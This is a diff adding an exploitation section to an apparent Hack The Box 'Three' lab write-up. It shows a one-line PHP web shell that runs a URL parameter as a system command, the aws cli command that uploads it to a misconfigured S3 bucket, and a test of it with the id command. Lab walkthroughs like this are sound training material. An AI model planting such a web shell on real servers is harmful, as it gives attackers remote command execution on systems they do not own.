@@ -51,14 +51,32 @@ aws --endpoint=http://thetoppers.htb s3 ls s3://thetoppers.htb
 ![S3-Bucket-Objects](Images/three_bucket-objects.jpeg)
 
 
-
+The s3 bucket object index.php confirms that the website is running PHP
 
 
 
 
 ### Exploitation
 
+Created a PHP function and file to take the URL parameter cmd as an input and execute it as a system command
 
+```bash
+echo '<?php system($_GET['cmd']); ?>' >  shell.php
+```
+
+![Shell-Payload](Images/three_shell-payload.jpeg)
+
+Uploaded the PHP shell file to the S3 bucket 
+
+```bash 
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+
+![Shell-Upload](Images/three_shell-upload.jpeg)
+
+Confirmed the existence of the uploaded shell by navigating to http://s3.thetoppers.htb/shell.php and executing the id command 
+
+[!Shell-Success](Images/three_shell-confirmation.jpeg)
 
 
 
